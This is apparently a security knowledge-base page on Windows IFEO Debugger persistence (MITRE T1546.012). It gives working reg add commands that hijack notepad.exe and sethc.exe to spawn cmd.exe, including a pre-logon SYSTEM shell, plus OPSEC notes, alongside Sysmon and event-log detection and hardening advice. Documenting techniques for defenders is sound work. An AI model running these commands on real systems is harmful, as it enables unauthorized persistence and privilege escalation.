---
title: IFEO Debugger Persistence
slug: ifeo-debugger-persistence
---

> **TL;DR:** Set a `Debugger` value under an Image File Execution Options registry key and Windows will launch your binary instead of the targeted executable — silent persistence, privilege escalation, and accessibility-feature hijacks all in one knob.

## What it is
The Image File Execution Options (IFEO) registry subtree was designed to let developers attach a debugger automatically when a named executable starts. Windows honours the `Debugger` REG_SZ value at `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<exe>` by spawning that command with the original target appended as an argument. Attackers abuse this to redirect launches of legitimate binaries (notepad.exe, sethc.exe, magnify.exe) to a payload — MITRE ATT&CK T1546.012.

## Preconditions / where it applies
- Local administrator (HKLM write) — or HKCU write for the per-user variant on modern Windows
- Target executable name must match exactly; no path resolution is performed
- 32-bit hijacks need the `Wow6432Node\...\Image File Execution Options` mirror

## Technique
Pick a benign-looking target the user or system already launches, point its Debugger value at your loader, and let normal user activity trigger the payload. Pairing with accessibility binaries (sethc.exe — sticky keys, utilman.exe) yields a pre-auth SYSTEM shell from the logon screen.

```cmd
:: classic notepad → cmd hijack
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" ^
  /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f

:: sticky keys SYSTEM shell at logon screen
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" ^
  /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
```

OPSEC: the spawned process inherits the launcher's token (SYSTEM for winlogon-triggered accessibility binaries). The `GlobalFlag` + `SilentProcessExit` variant offers a stealthier branch that fires only on process exit.

## Related: [[registry-persistence]], [[uac-bypass-techniques]]

## Detection and defence
- Sysmon Event ID 13 (RegistryValueSet) on any path containing `Image File Execution Options` and value name `Debugger` / `GlobalFlag` / `MonitorProcess`
- Security 4657 with the same registry filter when registry auditing is on
- Hunt for processes whose parent is a different executable than their own command line (e.g., cmd.exe spawned by winlogon.exe)
- Hardening: deny non-admin write to the IFEO key; restrict accessibility binary replacement with WDAC

## References
- [ired.team — IFEO Injection](https://www.ired.team/offensive-security/privilege-escalation/t1183-image-file-execution-options-injection) — original walkthrough
- [MITRE ATT&CK T1546.012](https://attack.mitre.org/techniques/T1546/012/) — IFEO sub-technique and detection guidance
